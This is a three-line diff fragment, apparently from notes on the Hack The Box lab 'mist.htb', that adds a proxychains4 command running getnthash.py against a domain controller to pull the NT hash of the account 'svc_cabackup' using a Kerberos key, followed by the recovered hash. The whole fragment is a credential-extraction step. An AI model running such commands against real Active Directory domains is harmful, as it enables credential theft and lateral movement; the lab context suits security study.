@@ -1,0 +1,3 @@
+proxychains4 getnthash.py  -dc-ip 192.168.100.100 -debug mist.htb/'svc_cabackup' -key c490a6ebb7cd13dffe5a8423bb4fd2d8081bce92c1eead6d4b155fecc5db3d9c
+
+> c9872f1bc10bdd522c12fc2ac9041b64
